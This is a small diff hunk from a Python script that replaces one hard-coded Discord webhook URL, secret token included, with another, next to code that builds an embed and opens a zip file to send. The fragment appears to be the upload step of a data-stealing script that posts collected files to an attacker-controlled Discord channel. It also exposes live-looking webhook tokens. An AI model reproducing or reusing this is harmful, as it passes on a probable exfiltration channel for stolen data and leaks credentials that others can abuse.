@@ -453,7 +453,7 @@ embed = {
 payload = {"embeds": [embed]}
 
 
-webhook1 = "https://discord.com/api/webhooks/1329863693823115459/sqegE7kgrnM1NnLAuAkXYigrK2ewbsAtdsTdIv4R8n50kgodZ7XgGes2NZ2mW8iJakwg"
+webhook1 = "https://discord.com/api/webhooks/1335193575016628307/Po03xt5JyRDny38YFa80xaylQRKxvYtsDzlcJuBhAJxQRdAlLgeN8EW7jIu3eJFvO8Cc"
 webhook2 = "~~"
 
 with open(zipPath, "rb") as zipFileToSend:
